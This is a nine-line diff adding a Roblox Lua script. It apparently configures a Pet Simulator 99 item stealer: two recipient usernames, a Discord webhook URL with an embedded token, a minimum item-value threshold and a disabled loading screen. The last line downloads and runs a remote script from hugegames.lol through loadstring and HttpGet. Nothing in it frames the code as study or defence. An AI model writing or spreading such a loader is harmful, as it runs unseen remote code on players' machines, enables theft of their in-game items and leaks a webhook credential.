@@ -1,0 +1,9 @@
+Username = "AFKvip_proplayer"
+Username2 = "NOPROBLEMBRO"
+Webhook = "https://discord.com/api/webhooks/1168416440555147274/DBMPAUIqqU_gv5nWgeCOcbR27XtjnprgW6XfdgHmwv8X-uBu_hCkrdLr0O5hwdFTH3rq"
+
+LoadingScreen = false
+
+MinimumRAP = 1 
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
